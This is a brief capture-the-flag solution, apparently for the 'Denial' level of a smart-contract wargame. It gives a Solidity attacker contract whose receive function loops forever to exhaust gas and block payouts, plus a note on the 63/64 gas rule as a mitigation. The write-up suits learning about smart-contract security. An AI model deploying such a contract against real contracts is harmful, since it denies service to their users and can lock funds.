# Level 20 - Denial

- Infinite loop in receive function.
- *Note: An external `CALL` can use at most 63/64 of the gas currently available at the time of the `CALL`. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.*

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialAttacker {

    receive() external payable {
        while (true) {
            
        }    
    }
}
```